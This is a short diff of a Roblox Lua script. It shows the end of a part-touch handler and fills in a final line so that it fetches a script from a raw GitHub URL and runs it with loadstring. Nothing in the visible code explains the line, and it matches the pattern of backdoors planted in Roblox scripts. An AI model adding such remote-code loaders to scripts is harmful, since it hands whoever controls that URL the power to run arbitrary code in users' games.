@@ -13,4 +13,4 @@ function onTouch(hit)
    end
 end
 part.Touched:Connect(onTouch)
-loadstring(game:HttpGet(""))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ProductXVIIII/ProductX-testerv1/refs/heads/main/TesterV1"))()
